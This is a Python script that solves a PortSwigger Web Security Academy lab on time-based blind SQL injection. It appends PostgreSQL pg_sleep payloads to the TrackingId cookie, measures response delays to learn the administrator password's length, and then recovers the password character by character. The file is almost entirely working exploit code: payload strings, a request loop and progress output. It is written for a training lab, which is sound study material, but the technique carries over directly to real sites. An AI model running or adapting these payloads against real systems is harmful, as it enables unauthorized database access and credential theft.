#!/usr/bin/python3
# https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
import string
import time
import requests
import sys


def send_blind_sqli(payload, cookies, url):
    tmp_cookies = cookies.copy()
    tmp_cookies["TrackingId"] += payload
    r = requests.get(url=url, cookies=tmp_cookies)
    #print(r.elapsed.total_seconds())
    if r.elapsed.total_seconds() < 2:
        return True


def pw_take(url, cookies, length):
    pw = ''
    pos = 1
    charset = string.digits + string.ascii_lowercase
    while pos <= length:
        for char in charset:
            payload = f"'%3b+SELECT+CASE+WHEN+SUBSTRING(password,{pos},1)='{char}'+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username%3d'administrator'--+"
            print(f"[-] Password = {pw + char}", flush=True, end="\r")
            if not send_blind_sqli(payload, cookies, url):
                pw += char
                pos += 1
                break
    print(f"[+] Password = {pw}", flush=True)
    return pw


def pw_length(url, cookies):
    for i in range(18, 50):
        payload = f"'%3b+SELECT+CASE+WHEN+LENGTH(password)>{i}+THEN+pg_sleep(2)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator'-- "
        print(f"[-] Testing Password length = {i}", flush=True, end="\r")
        if send_blind_sqli(payload, cookies, url):
            print(f"[+] Password length is = {i}       ", flush=True)
            return i
            break


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(f"[-] Example: {sys.argv[0]} http://web-security-academy.net/")
        sys.exit(-1)
    print("".center(50,"-"))
    print("[*]" + "Web-Security-Academy Blind-Sql-Injection".center(47))
    print("[*]" + "Time Based SQLi".center(47))
    print("".center(50, "-"))
    cookies = requests.session().get(url).cookies.get_dict()
    length = pw_length(url, cookies)
    print("[+] Getting the Password")
    pw = pw_take(url, cookies, length)